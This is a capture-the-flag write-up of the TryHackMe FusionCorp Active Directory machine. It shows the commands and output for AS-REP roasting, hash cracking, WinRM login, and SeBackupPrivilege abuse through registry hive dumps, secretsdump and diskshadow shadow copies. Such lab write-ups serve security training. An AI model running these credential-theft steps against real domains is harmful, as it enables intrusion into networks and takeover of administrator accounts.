---
title: FusionCorp
date: 2023-07-07
categories: TryHackMe ActiveDirectory
tags:     # TAG names should always be lowercase
---


# Introduction

This machine involves 3 flags of 3 users i guess 2 of them are normal users and the last one to be the administrator so let's get started.


# User 1

Doing an nmap scan will reveal a lot of ports most of which i can get some clue of this machine being related to active directory also it has a web server on port 80, we add the domain controller domain and the fusion corp domain to /etc/hosts

![](/assets/img/fusioncorp/nmapscan.png)
![](/assets/img/fusioncorp/addhosts.png)

Doing a little enumeration with feroxbuster reveals a directory called backups with a spreadsheet file called employees open it and it has the AD users


![](/assets/img/fusioncorp/backupfound.png)
![](/assets/img/fusioncorp/backupsdirectory.png)
![](/assets/img/fusioncorp/addedusers.png)

Now after doing this i ran impacket-GetNPUsers to get some exposed TGTs

```bash

$ impacket-GetNPUsers fusion.corp/ -no-pass -usersfile users
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e - Copyright 2022 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$lparker@FUSION.CORP:6b99767cf796b2cb6c01c27db59d07f0$dc9c5016289169f6a418e26e9f3f7c995642c4991ad0d1e990a7bf565ebbe7ad6e897c3d604cefb5e192d235fe11f5ed8d0a338120887f6428757739e441b63cebf3a9dcc191a18d0ddf82c2459fe439a3dcdc0fa2182c44b1d2314a42875d36c81dfaaa178a5ac631c5570850767153100920c5eae7d78f581a752e9720f519a46eb7501078cef4bd2d8382c3c986f98e324d15f10ee0bb0738563adc157f14ee16fbbe798b2e71228b4b5439956e91073745b9b05bf7f06037e63fc1cad6802ea5b5cfb36006b491478125dd453f47cd83d061ec823f2f059a181018f5e4f1cedb538d4f9d1df3f307
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

Let's crack the hash with hashcat

```bash

$ hashcat -m 18200 -a 0 lparker.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-penryn-Intel(R) Pentium(R) CPU 4417U @ 2.30GHz, 1837/3739 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$lparker@FUSION.CORP:6b99767cf796b2cb6c01c27db59d07f0$dc9c5016289169f6a418e26e9f3f7c995642c4991ad0d1e990a7bf565ebbe7ad6e897c3d604cefb5e192d235fe11f5ed8d0a338120887f6428757739e441b63cebf3a9dcc191a18d0ddf82c2459fe439a3dcdc0fa2182c44b1d2314a42875d36c81dfaaa178a5ac631c5570850767153100920c5eae7d78f581a752e9720f519a46eb7501078cef4bd2d8382c3c986f98e324d15f10ee0bb0738563adc157f14ee16fbbe798b2e71228b4b5439956e91073745b9b05bf7f06037e63fc1cad6802ea5b5cfb36006b491478125dd453f47cd83d061ec823f2f059a181018f5e4f1cedb538d4f9d1df3f307:REDACTED

```

Since we have a password before starting the recon let's see if we can connect with winrm to fusioncorp

```bash

$ evil-winrm  -i fusion.corp -u lparker -p 'REDACTED'                                                               
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lparker\Documents> 
*Evil-WinRM* PS C:\Users\lparker\Documents> dir
*Evil-WinRM* PS C:\Users\lparker\Documents> cd ..
*Evil-WinRM* PS C:\Users\lparker> dir


    Directory: C:\Users\lparker


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         3/3/2021   5:57 AM                Desktop
d-r---         3/3/2021   5:54 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\lparker> cd Desktop
*Evil-WinRM* PS C:\Users\lparker\Desktop> dir


    Directory: C:\Users\lparker\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\lparker\Desktop> type flag.txt
THM{REDACTED}

```

# User 2


Now that i have the first user i use crackmapexec to check the available shares<


```bash

$ crackmapexec smb fusion.corp -u 'lparker' -p 'REDACTED' --shares
SMB         fusion.corp     445    FUSION-DC        [*] Windows 10.0 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
SMB         fusion.corp     445    FUSION-DC        [+] fusion.corp\lparker:REDACTED 
SMB         fusion.corp     445    FUSION-DC        [+] Enumerated shares
SMB         fusion.corp     445    FUSION-DC        Share           Permissions     Remark
SMB         fusion.corp     445    FUSION-DC        -----           -----------     ------
SMB         fusion.corp     445    FUSION-DC        ADMIN$                          Remote Admin
SMB         fusion.corp     445    FUSION-DC        C$                              Default share
SMB         fusion.corp     445    FUSION-DC        IPC$            READ            Remote IPC
SMB         fusion.corp     445    FUSION-DC        NETLOGON        READ            Logon server share 
SMB         fusion.corp     445    FUSION-DC        SYSVOL          READ            Logon server share



```

now we have IPC$ readable and i could perform a rid bruteforce with cme but since i've already got the users, impacket-GetUserSPNs seems something i should try
but well it didn't worked

```bash

$ impacket-GetUserSPNs fusion.corp/lparker:'REDACTED' -usersfile users -no-pass -request
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[-] Principal: jmickel - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: aarnold - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: llinda - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: jpowel - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: dvroslav - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: tjefferson - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: nmaurin - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: mladovic - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: lparker - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: kgarland - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: dpertersen - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)


```

now inside the machine i checked for privilege i had or groups and then i realized i should do some lateral movement :)  i checked for other users in the box and
found jmurphy i had no idea how i should proceed so i checked for any interesting description about the user

```powershell

*Evil-WinRM* PS C:\Users\lparker\Documents> net user 

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    jmurphy
krbtgt                   lparker
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\lparker\Documents> net user jmurphy /all
net.exe : The option /ALL is unknown.
    + CategoryInfo          : NotSpecified: (The option /ALL is unknown.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
The syntax of this command is:NET USER[username [password | *] [options]] [/DOMAIN]         username {password | *} /ADD [options] [/DOMAIN]         username [/DELETE] [/DOMAIN]         username [/TIMES:{times | ALL}]         username [/ACTIVE: {YES | NO}]More help is available by typing NET HELPMSG 3506.*Evil-WinRM* PS C:\Users\lparker\Documents> net se                      
*Evil-WinRM* PS C:\Users\lparker\Documents> net user jmurphy
User name                    jmurphy
Full Name                    Joseph Murphy
Comment                      Password set to REDACTED
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/3/2021 6:41:24 AM
Password expires             Never
Password changeable          3/3/2021 6:41:24 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\lparker\Documents>

```

also before logging to the user i already can see jmurphy being on the backup operators so the privesc should be really easy, right?


# User 3



Now this is pretty straightforward privesc to Administrator i just need to dump the sam and system then download them and use impacket-secretsdump to obtain the
Administrator NTLM hash and log in via winrm doing a pass the hash attack.

```powershell

*Evil-WinRM* PS C:\Users\jmurphy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\jmurphy\Documents> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\jmurphy\Documents> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\jmurphy\Documents> dir


    Directory: C:\Users\jmurphy\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/7/2023   4:26 PM          49152 sam
-a----         7/7/2023   4:27 PM       18075648 system


```

the only thing left is download them, btw system takes a lot of time :( run impacket-secretsdump and get the Administrator NTLM hash then login to winrm

```bash

$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.10.1.dev1+20230511.163246.f3d0b9e - Copyright 2022 Fortra

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...

```

But it didn't worked since i think Administrator user is not in the Remote Management Users so we have to chage the tool to use, now we will use diskshadow
to make a shadow copy. i looked in google and found ![**a guide to use diskshadow**](https://juggernaut-sec.com/sebackupprivilege/) so after following that steps 
i made a shadow copy and tried to read the flag

```powershell

*Evil-WinRM* PS C:\Windows\temp> diskshadow.exe /s c:\Windows\temp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  FUSION-DC,  7/7/2023 5:26:02 PM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {2f068120-8f43-4a2a-8987-c8058e898188} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {9ea220e6-a403-43ad-b78b-ba251611c03a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {9ea220e6-a403-43ad-b78b-ba251611c03a}

        * Shadow copy ID = {2f068120-8f43-4a2a-8987-c8058e898188}               %temp%
                - Shadow copy set: {9ea220e6-a403-43ad-b78b-ba251611c03a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{66a659a9-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/7/2023 5:26:07 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: Fusion-DC.fusion.corp
                - Service machine: Fusion-DC.fusion.corp
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {2f068120-8f43-4a2a-8987-c8058e898188}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\Windows\temp> cd z:\
*Evil-WinRM* PS z:\> dir


    Directory: z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/3/2021   3:59 AM                inetpub
d-----         3/7/2021   2:02 AM                PerfLogs
d-r---         3/7/2021   2:52 AM                Program Files
d-----         3/3/2021   3:49 AM                Program Files (x86)
d-----         3/3/2021   6:07 AM                stuff
d-r---         3/3/2021   5:54 AM                Users
d-----         3/7/2021   2:59 AM                Windows


*Evil-WinRM* PS z:\> cd Users
*Evil-WinRM* PS z:\Users> cd Administrator\Desktop
*Evil-WinRM* PS z:\Users\Administrator\Desktop> dir


    Directory: z:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:05 AM             37 flag.txt


*Evil-WinRM* PS z:\Users\Administrator\Desktop> type flag.txt
Access to the path 'z:\Users\Administrator\Desktop\flag.txt' is denied.
At line:1 char:1
+ type flag.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (z:\Users\Administrator\Desktop\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS z:\Users\Administrator\Desktop>

```

so uh that went wrong, i needed to use robocopy, i used this to get the flag

```powershell

*Evil-WinRM* PS C:\Windows\Temp> robocopy /b Z:\Users\Administrator\Desktop C:\Windows\Temp flag.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, July 7, 2023 5:34:12 PM
   Source : Z:\Users\Administrator\Desktop\
     Dest : C:\Windows\Temp\

    Files : flag.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Users\Administrator\Desktop\
            New File                  37        flag.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        37        37         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :                1850 Bytes/sec.
   Speed :               0.105 MegaBytes/min.
   Ended : Friday, July 7, 2023 5:34:12 PM

*Evil-WinRM* PS C:\Windows\Temp> type flag.txt

```

I hope you liked the writeup have a nice day :D
